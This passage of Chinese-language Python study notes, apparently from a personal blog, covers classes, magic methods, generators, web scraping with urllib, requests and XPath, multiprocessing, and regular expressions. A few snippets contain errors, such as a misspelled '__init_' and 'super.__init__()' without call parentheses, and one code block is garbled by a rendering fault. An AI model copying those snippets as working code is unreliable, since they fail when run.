<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">raise</span> ZeroDivisionError(<span class="string">&quot;除数不嫩那个为零！&quot;</span>) <span class="comment"># 括号为对异常的解释，可省略</span></span><br></pre></td></tr></table></figure>
<h3 id="else">else<a class="header-anchor" href="#else"> ¶ </a></h3>
<p>只要try语句块没有出现任何异常，就会执行else语句块的内容</p>
<h3 id="with语句">with语句<a class="header-anchor" href="#with语句"> ¶ </a></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;read.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> each_line <span class="keyword">in</span> f:</span><br><span class="line">            <span class="built_in">print</span>(each_line)</span><br><span class="line"><span class="keyword">except</span> OSError <span class="keyword">as</span> reason:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;出错啦：&quot;</span>  + <span class="built_in">str</span>(reason))</span><br></pre></td></tr></table></figure>
<h2 id="类和对象">类和对象<a class="header-anchor" href="#类和对象"> ¶ </a></h2>
<h3 id="定义一个类">定义一个类<a class="header-anchor" href="#定义一个类"> ¶ </a></h3>
<p><code>__init__</code>为构造方法，定义这个类的属性，<strong>第一个参数为self（类似this）</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ball</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init_</span>(<span class="params">self, name</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setName</span>(<span class="params">self, name</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kick</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;我叫%s,谁踢我?!&quot;</span> % self.name)</span><br></pre></td></tr></table></figure>
<h3 id="公有、私有">公有、私有<a class="header-anchor" href="#公有、私有"> ¶ </a></h3>
<p>python默认公有，定义私有属性需要在  变量名或者函数名前加上<code>__</code>两个下划线，就会变成私有的了。</p>
<h3 id="类的继承">类的继承<a class="header-anchor" href="#类的继承"> ¶ </a></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> 类名(<span class="params">被继承的类</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#### 多重继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> 子类(<span class="params">父类<span class="number">1</span>, 父类<span class="number">2</span>, ....</span>):</span>	<span class="comment"># 多个父类使用,分隔</span></span><br></pre></td></tr></table></figure>
<p>子类定义与父类同名的方法或者属性，则会自动覆盖父类对应的方法或者属性（方法重写）</p>
<p>子类在构造方法中需要写父类的构造方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span>(<span class="params">Fish</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        Fish.__init__(self)</span><br><span class="line">        self.hungry = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 或者使用super(推荐)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span>(<span class="params">Fish</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>.__init__()</span><br><span class="line">        self.hungry = <span class="literal">True</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="类的组合">类的组合<a class="header-anchor" href="#类的组合"> ¶ </a></h3>
<p>一个类中的属性是另一个类</p>
<h3 id="类对象和实例对象">类对象和实例对象<a class="header-anchor" href="#类对象和实例对象"> ¶ </a></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">a = C()</span><br><span class="line">b = C()</span><br><span class="line">c = C()</span><br><span class="line"><span class="built_in">print</span>(a.count, b.count, c.count)	<span class="comment"># 0 0 0</span></span><br><span class="line">c.count += <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(a.count, b.count, c.count)	<span class="comment"># 0 0 10</span></span><br><span class="line">C.count += <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(a.count, b.count, c.count)	<span class="comment"># 100 100 10</span></span><br></pre></td></tr></table></figure>
<p>当对实例对象c的属性进行赋值时，会覆盖类对象的属性；如果没有赋值，则引用类对象的属性</p>
<h3 id="绑定">绑定<a class="header-anchor" href="#绑定"> ¶ </a></h3>
<p>类方法第一个参数要传<code>self</code></p>
<h3 id="类和对象-BIF-内置函数-：">类和对象 BIF(内置函数)：<a class="header-anchor" href="#类和对象-BIF-内置函数-："> ¶ </a></h3>
<table>
<thead>
<tr>
<th style="text-align:center">BIF</th>
<th style="text-align:center">用途</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>issubclass(class,classinfo)</code></td>
<td style="text-align:center">如果class是classinfo的子类则返回True</td>
</tr>
<tr>
<td style="text-align:center"><code>isinstance(object,classinfo)</code></td>
<td style="text-align:center">如果object是classinfo的[子类]实例对象 返回True</td>
</tr>
<tr>
<td style="text-align:center"><code>hasattr(object, name)</code></td>
<td style="text-align:center">若object对象含有name属性，返回True</td>
</tr>
<tr>
<td style="text-align:center"><code>getattr(object, name[,default])</code></td>
<td style="text-align:center">返回对象指定的属性值，若属性不存在返回default的值/default不存在AttributeError异常</td>
</tr>
<tr>
<td style="text-align:center"><code>setattr(object,name,value)</code></td>
<td style="text-align:center">设置对象中指定属性的值，指定属性不存在则新建属性</td>
</tr>
<tr>
<td style="text-align:center"><code>delattr(object,name)</code></td>
<td style="text-align:center">删除对象指定属性，属性不存在抛出AttributeError异常</td>
</tr>
<tr>
<td style="text-align:center">property()</td>
<td style="text-align:center">给属性绑定getter setter方法</td>
</tr>
</tbody>
</table>
<p>classinfo可以为 类对象组成的元组， 只要其中有一个类来符合条件 就可</p>
<h2 id="魔法方法">魔法方法<a class="header-anchor" href="#魔法方法"> ¶ </a></h2>
<h3 id="注意">注意<a class="header-anchor" href="#注意"> ¶ </a></h3>
<p><a href="https://www.cnblogs.com/zhouyixian/p/11129347.html" title="魔法方法">魔法方法</a></p>
<ul>
<li>魔法方法总是被左右各两个下画线包围，例如_ _init_ _()</li>
<li>魔法方法是面向对象的Python的一切</li>
</ul>
<h3 id="构造和析构">构造和析构<a class="header-anchor" href="#构造和析构"> ¶ </a></h3>
<h4 id="init-self-…">__init__(self[,…])<a class="header-anchor" href="#init-self-…"> ¶ </a></h4>
<ul>
<li>
<p><strong>相当于</strong>构造方法</p>
</li>
<li>
<p><code>_ _init_ _()</code>方法的<strong>返回值一定是None</strong></p>
</li>
<li>
<p>只有在需要进行初始化的时候才重写</p>
</li>
<li>
<p><code>_ _init_ _()</code>并<strong>不是</strong>实例化对象时<strong>第一个被调用</strong>的魔法方法</p>
</li>
</ul>
<h4 id="new-cls-…">__new__(cls[, …])<a class="header-anchor" href="#new-cls-…"> ¶ </a></h4>
<ul>
<li>在一个对象实例化的时候<strong>调用的第一个方法</strong></li>
<li>第一个参数不是self而是这个类(cls)，而其他的参数会直接传递给_ _init_ _()方法</li>
<li>返回一个实例对象，通常是cls这个类实例化的对象，当然也可以返回其他对象</li>
<li>当继承一个不可变的类型的时候，需要重写这个方法</li>
</ul>
<h4 id="del">__del__<a class="header-anchor" href="#del"> ¶ </a></h4>
<ul>
<li>只要在程序没有退出的时候，就执行了<code> del 对象名</code>，就会执行对象对应的类中的del方法</li>
<li><code>_ _del_ _()</code>方法是当垃圾回收机制回收这个对象的时候调用的</li>
</ul>
<h3 id="算数运算">算数运算<a class="header-anchor" href="#算数运算"> ¶ </a></h3>
<ul>
<li>python2.2后将int()、float()、str()、list()、tuple()这些BIF转换为工厂函数<code>&lt;class 'type'&gt;</code>
<ul>
<li>普通bif是<code>&lt;class 'builtin_function_or_method'&gt;</code></li>
</ul>
</li>
<li><a href="https://www.cnblogs.com/generaotr/p/10565320.html" title="工厂函数">工厂函数理解</a>，<a href="https://www.zhihu.com/question/20670869" title="工厂函数">工厂函数</a></li>
</ul>
<h4 id="常见算术运算">常见算术运算<a class="header-anchor" href="#常见算术运算"> ¶ </a></h4>
<h4 id="反运算">反运算<a class="header-anchor" href="#反运算"> ¶ </a></h4>
<ul>
<li>反运算魔法方法，一定要注意顺序问题</li>
</ul>
<h4 id="一元操作符">一元操作符<a class="header-anchor" href="#一元操作符"> ¶ </a></h4>
<h3 id="定制">定制<a class="header-anchor" href="#定制"> ¶ </a></h3>
<ul>
<li><strong>如果类中的方法名和属性同名，属性会覆盖方法</strong></li>
</ul>
<h3 id="属性访问">属性访问<a class="header-anchor" href="#属性访问"> ¶ </a></h3>
<ul>
<li>
<p>通过点（.）操作符去访问对象的属性</p>
<ul>
<li>还有bif：getattr，setattr，delattr</li>
<li>property()函数</li>
</ul>
</li>
<li>
<p>用<code>super().</code>可以有效解决死循环</p>
</li>
</ul>
<h3 id="描述符（property原理）">描述符（property原理）<a class="header-anchor" href="#描述符（property原理）"> ¶ </a></h3>
<ul>
<li>
<p>描述符就是将某种特殊类型的类的实例指派给另一个类的属性</p>
<ul>
<li>特殊类型的类指的是：至少要在这个类里边定义<code>_ _get_ _()</code>、<code>__set_ _()</code>或<code>__delete_ _()</code>三个特殊方法中的<strong>任意一个</strong></li>
</ul>
</li>
<li>
<p>与其类似的<a href="https://www.runoob.com/python/python-func-property.html" title="property">property()</a></p>
</li>
</ul>
<h3 id="定制序列">定制序列<a class="header-anchor" href="#定制序列"> ¶ </a></h3>
<ul>
<li>
<p>容器包括：</p>
<ul>
<li>序列类型：如列表、元组、字符串</li>
<li>映射类型：如字典</li>
</ul>
</li>
<li>
<p>定制容器的有关协议：</p>
<ul>
<li>如果希望定制的容器不可变，则只需要定义<code>_ _len_ _()</code>和<code>_ _getitem_ _()</code>方法</li>
<li>如果希望定制的容器是可变的，除了<code>_ _len_ _()</code>和<code>_ _getitem_ _()</code>方法，还需要定义<code>_ _setitem_ _()</code>和<code>_ _delitem_ _()</code>两个方法</li>
</ul>
</li>
<li>
<p>定制容器相关的魔法方法：</p>
</li>
</ul>
<h3 id="迭代器">迭代器<a class="header-anchor" href="#迭代器"> ¶ </a></h3>
<ul>
<li>
<p>提供迭代方法的容器称为迭代器，通常接触的迭代器有序列（如列表、元组、字符）、字典等，它们都支持迭代的操作</p>
</li>
<li>
<p>对一个容器对象调用iter()就得到它的迭代器。调用next()迭代器就会返回下一个值，如果迭代器没有值可以返回了Python会抛出一个名为StopIteration的异常。</p>
</li>
</ul>
<h3 id="生成器">生成器<a class="header-anchor" href="#生成器"> ¶ </a></h3>
<ul>
<li>
<p>仅通过普通函数，不涉及魔法方法</p>
</li>
<li>
<p>Python是通过生成器来实现类似于协同程序的概念：生成器可以暂时挂起函数，并保留函数的局部变量等数据，然后再次调用它的时候，从上次暂停的位置继续执行下去。</p>
</li>
<li>
<p>yield语句</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myGen</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;生成器被执行&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">myG = myGen()</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">next</span>(myG) <span class="comment">### 生成器被执行</span></span><br><span class="line">			<span class="comment">### 1</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">next</span>(myG) <span class="comment">### 2 </span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>由于Python的for循环会自动调用next()方法和处理StopIteration异常，所以for循环当然也是可以对生成器产生作用</p>
</li>
</ul>
<h3 id="生成器表达式">生成器表达式<a class="header-anchor" href="#生成器表达式"> ¶ </a></h3>
<ul>
<li>
<p>列表推导式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> [i*i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"><span class="number">2.</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> <span class="keyword">not</span>(i%<span class="number">2</span>) <span class="keyword">and</span> i%<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>字典推导式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;i:i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;</span><br><span class="line">&#123;<span class="number">0</span>: <span class="literal">True</span>, <span class="number">1</span>: <span class="literal">False</span>, <span class="number">2</span>: <span class="literal">True</span>, <span class="number">3</span>: <span class="literal">False</span>, <span class="number">4</span>: <span class="literal">True</span>, <span class="number">5</span>: <span class="literal">False</span>, <span class="number">6</span>: <span class="literal">True</span>, <span class="number">7</span>: <span class="literal">False</span>,<span class="number">8</span>: <span class="literal">True</span>, <span class="number">9</span>: <span class="literal">False</span>&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>集合推导式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;i <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">8</span>]&#125;</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="模块-2">模块<a class="header-anchor" href="#模块-2"> ¶ </a></h2>
<h3 id="导入模块">导入模块<a class="header-anchor" href="#导入模块"> ¶ </a></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> modelName</span><br><span class="line"><span class="keyword">import</span> modelName <span class="keyword">as</span> newName</span><br><span class="line"><span class="keyword">from</span> modelName <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>
<h3 id="name-属性"><code>__name__</code>属性<a class="header-anchor" href="#name-属性"> ¶ </a></h3>
<p>作为程序运行时候，py程序的<code>__name__</code>属性的值是<code>'__main__'</code></p>
<p>作为模块被导入时，这个值为模块的名字</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 作为模块被导入的时候不会执行，作为程序的时候会执行</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="爬虫">爬虫<a class="header-anchor" href="#爬虫"> ¶ </a></h2>
<h3 id="urllib模块">urllib模块<a class="header-anchor" href="#urllib模块"> ¶ </a></h3>
<table>
<thead>
<tr>
<th style="text-align:center">模块函数</th>
<th style="text-align:center">参数/返回值</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>urllib.request.urlopen()</code></td>
<td style="text-align:center">参数为url字符串或者request对象，返回类文件对象</td>
<td style="text-align:center">访问网址</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>爬取的都是以utf-8编码的bytes对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">response = urllib.request.urlopen(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">html = response.read()		<span class="comment"># urlopen返回的类文件对象可以直接用文件方法read()</span></span><br></pre></td></tr></table></figure>
<p>示例：下载图片</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">img_obj = urllib.request.Request(<span class="string">&quot;http://placekitten.com/800/800&quot;</span>)</span><br><span class="line">img_reponse = urllib.request.urlopen(img_obj)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./cat.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    jpg = img_reponse.read()</span><br><span class="line">    f.write(jpg)</span><br></pre></td></tr></table></figure>
<h3 id="request库">request库<a class="header-anchor" href="#request库"> ¶ </a></h3>
<ul>
<li>
<p>r.text是服务器响应的内容，会自动根据响应头部的字符编码进行解码。</p>
</li>
<li>
<p>r.content也是相应返回的字节码</p>
</li>
<li>
<p>r.encoding是服务器内容使用的文本编码。</p>
</li>
<li>
<p>r.status_code用于检测响应的状态码，如果返回200，就表示请求成功了;如果返回的是4xx，就表示客户端错误;返回5xx则表示服务器错误响应。我们可以用r.status_code来检测请求是否正确响应。</p>
</li>
<li>
<p>使用代理，需配置get()参数<code>proxies</code></p>
<ul>
<li>
<pre><code class="language-python">proxies = &#123;
    'http' : address,
    'https' : address,
&#125;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 保存cookie，创建一个session对象， 使用session对象来进行get和post</span><br><span class="line"></span><br><span class="line">  - ```python</span><br><span class="line">    session = requests.Session()</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
</li>
<li></li>
</ul>
<h3 id="Xpath模块">Xpath模块<a class="header-anchor" href="#Xpath模块"> ¶ </a></h3>
<ul>
<li>安装 <code>python -m pip install lxml</code></li>
<li>使用时需导入 <code>from lxml import etree</code></li>
</ul>
<p>学习语法：<a href="https://www.runoob.com/xpath/xpath-tutorial.html">菜鸟教程 Xpath教程</a></p>
<ul>
<li>提取标签内容使用<code>/text()</code></li>
<li>提取标签属性的属性值使用<code>/@attrname</code></li>
</ul>
<p>部分语法</p>
<table>
<thead>
<tr>
<th style="text-align:center">表达式</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">nodename</td>
<td style="text-align:left">选取此节点的所有子节点。</td>
</tr>
<tr>
<td style="text-align:center">/</td>
<td style="text-align:left">从根节点选取。</td>
</tr>
<tr>
<td style="text-align:center">//</td>
<td style="text-align:left">从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。</td>
</tr>
<tr>
<td style="text-align:center">.</td>
<td style="text-align:left">选取当前节点。</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:left">选取当前节点的父节点。</td>
</tr>
<tr>
<td style="text-align:center">@</td>
<td style="text-align:left">选取属性。</td>
</tr>
<tr>
<td style="text-align:center"><code>[starts-with(@attr,value)]</code></td>
<td style="text-align:left">筛选出 标签属性值前半部分相同的</td>
</tr>
<tr>
<td style="text-align:center"><code>string(.)</code></td>
<td style="text-align:left">提取标签里所有的文字</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:left"></td>
</tr>
</tbody>
</table>
<h4 id="示例">示例<a class="header-anchor" href="#示例"> ¶ </a></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    t_response = requests.get(<span class="string">&quot;http://www.zdqx.com/pcbz/&quot;</span>)</span><br><span class="line">    t_html = t_response.text</span><br><span class="line">    <span class="built_in">print</span>(t_response.encoding)</span><br><span class="line">    selector = etree.HTML(t_html.encode(<span class="string">&#x27;ISO-8859-1&#x27;</span>).decode())</span><br><span class="line">    result = selector.xpath(<span class="string">&#x27;//ul[@class=&quot;desklist hauto&quot;]/li/a/p/text()&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure>
<ul>
<li>如果出现中文乱码，自行查看网页编码进行转码，同上面例子</li>
<li>其他例子
<ul>
<li><code>/html/head/title</code>：选择HTML文档中head元素内的title元素。</li>
<li><code>/html/head/title/text()</code>：选择上面提到的title元素的文本。</li>
<li><code>//td</code>：选择所有的td元素。</li>
<li><code>//div[@class=&quot;mine&quot;]</code>：选择所有具有class=&quot;mine&quot;属性的div元<br>
素。</li>
</ul>
</li>
<li>xpath 返回的是列表，列表元素是Selector类型的对象</li>
<li><code>.extract()</code><strong>可以将Selector对象中</strong>data参数存储<strong>的字符串提取出来</strong></li>
</ul>
<h3 id="Python并行化">Python并行化<a class="header-anchor" href="#Python并行化"> ¶ </a></h3>
<p>简单示例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing  <span class="comment"># 并行化需要导入的库</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(i)    <span class="comment"># 可迭代对象的处理，尽量不要用输出，输出会乱</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">4</span>)    <span class="comment"># 并行化对象pool的声明，参数为进程数，与电脑核数有关</span></span><br><span class="line">    l = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">    pool.<span class="built_in">map</span>(printf, l)     <span class="comment"># 使用.map方法来对可迭代对象来进行参数一函数的处理</span></span><br><span class="line">    pool.close()        <span class="comment"># 关闭，执行完close后不会有新的进程加入到pool</span></span><br><span class="line">    pool.join()         <span class="comment"># join函数等待所有子进程结束</span></span><br></pre></td></tr></table></figure>
<h2 id="正则表达式">正则表达式<a class="header-anchor" href="#正则表达式"> ¶ </a></h2>
<h3 id="re模块">re模块<a class="header-anchor" href="#re模块"> ¶ </a></h3>
<p>使用前需要导入模块 <code>import re</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">方法</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>re.sarch(正则，字符串)</code></td>
<td style="text-align:center">从字符串中找正则匹配返回 一个匹配对象</td>
</tr>
<tr>
<td style="text-align:center"><code>re.compile(正则字符串)</code></td>
<td style="text-align:center">将正则编译成模式对象</td>
</tr>
<tr>
<td style="text-align:center"><code>匹配对象.group()</code></td>
<td style="text-align:center">获得匹配对象匹配的字符串</td>
</tr>
<tr>
<td style="text-align:center"><code>模式对象.findall()</code></td>
<td style="text-align:center">包含子组则返回子组组成的列表或者元组</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<h3 id="正则知识">正则知识<a class="header-anchor" href="#正则知识"> ¶ </a></h3>
<h4 id="字符类">字符类<a class="header-anchor" href="#字符类"> ¶ </a></h4>
<p>表示一个字符的范围，可以创建一个字符类。</p>
<p>使用中括号将任何内容包起来就是一个字符类；（大小写敏感，可关闭）含义：匹配这个字符类的任何字符就算匹配</p>
<ul>
<li>可使用<code>-</code>小斜杠来表示范围
<ul>
<li>匹配小写字母<code>[a-z]</code></li>
</ul>
</li>
<li>也可直接输入：<code>[abcde12345]</code>：匹配abcde12345中的任何一个字符</li>
</ul>
<h4 id="重复匹配">重复匹配<a class="header-anchor" href="#重复匹配"> ¶ </a></h4>
<p>使用大括号这对元字符来实现重复匹配的功能</p>
<ul>
<li>匹配 3 次：<code>[a-z]&#123;3&#125;</code></li>
<li>匹配3次或者4次或者5次（3到5次）：<code>[a-z]&#123;3,5&#125;</code></li>
</ul>
<h4 id="元字符">元字符<a class="header-anchor" href="#元字符"> ¶ </a></h4>
<ul>
<li>
<p><code>^</code>：匹配字符串的开始位置</p>
</li>
<li>
<p><code>$</code>：匹配字符串的结束位置</p>
</li>
<li>
<p><code>\</code>：</p>
<ul>
<li>将普通字符变成特殊(转义)字符；或者将特殊字符变成普通字符</li>
<li>反斜杠后加数字1~99，表示引用序号对应的子组所匹配的字符串</li>
<li>反斜杠后 0开头或者 三位数字  表示八进制数对应的ASCII字符</li>
</ul>
</li>
<li>
<p>小括号<code>()</code></p>
<p>子组：被 元字符小括号<code>()</code>括起来的正则表达式称为一个子组</p>
<p>例如：<code>(you)\1</code>匹配的是<code>youyou</code></p>
</li>
<li>
<p>中括号<code>[]</code>：生成一个字符类，内部的元字符全都市区了特殊的功能</p>
<ul>
<li><code>-</code>：表示范围</li>
<li><code>/</code>：用于字符串转义：<code>\n</code>匹配换行符</li>
<li><code>^</code>：表示取反</li>
<li><code>&#123;&#125;</code>：表示重复
<ul>
<li>重复2次<code>(you)&#123;2&#125;</code>：匹配<code>youyou</code></li>
<li>重复2~4次<code>(you)&#123;2,4&#125;</code>：匹配<code>youyou</code>，<code>youyouyou</code>，<code>youyouyouyou</code></li>
<li><code>*</code>：相当于<code>&#123;0,&#125;</code>  0次或者无穷多次</li>
<li><code>+</code>：相当于<code>&#123;1,&#125;</code>  匹配至少1次至无穷多次</li>
<li><code>?</code>：相当于<code>&#123;0,1&#125;</code>  匹配0次或者1次</li>
</ul>
</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">.</td>
<td style="text-align:center">匹配除换行符以外的任意字符</td>
</tr>
<tr>
<td style="text-align:center">\</td>
<td style="text-align:center">将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，‘n’ 匹配字符 “n”。‘\n’ 匹配一个换行符。序列 ‘\’ 匹配 “” 而 “(” 则匹配 “(”。</td>
</tr>
<tr>
<td style="text-align:center"><code>^</code></td>
<td style="text-align:center"><code>\A</code></td>
</tr>
<tr>
<td style="text-align:center"><code>$</code></td>
<td style="text-align:center"><code>\Z</code></td>
</tr>
<tr>
<td style="text-align:center">*</td>
<td style="text-align:center">匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
</tr>
<tr>
<td style="text-align:center">+</td>
<td style="text-align:center">匹配前面的子表达式一次或多次。例如，‘zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
</tr>
<tr>
<td style="text-align:center">?</td>
<td style="text-align:center">匹配前面的子表达式零次或一次。例如，“do(es)?” 可以匹配 “do” 或 “does” 。? 等价于 {0,1}。</td>
</tr>
<tr>
<td style="text-align:center">{n}</td>
<td style="text-align:center">n 是一个非负整数。匹配确定的 n 次。例如，‘o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
</tr>
<tr>
<td style="text-align:center">{n,}</td>
<td style="text-align:center">n 是一个非负整数。至少匹配n 次。例如，‘o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。‘o{1,}’ 等价于 ‘o+’。‘o{0,}’ 则等价于 ‘o*’。</td>
</tr>
<tr>
<td style="text-align:center">{n,m}</td>
<td style="text-align:center">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，“o{1,3}” 将匹配 “fooooood” 中的前三个 o。‘o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
</tr>
<tr>
<td style="text-align:center">?</td>
<td style="text-align:center">当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，‘o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。</td>
</tr>
<tr>
<td style="text-align:center">.</td>
<td style="text-align:center">匹配除换行符（\n、\r）之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用像&quot;<strong>(.|\n)</strong>&quot;的模式。</td>
</tr>
<tr>
<td style="text-align:center">(pattern)</td>
<td style="text-align:center">匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘(’ 或 ‘)’。</td>
</tr>
<tr>
<td style="text-align:center">(?:pattern)</td>
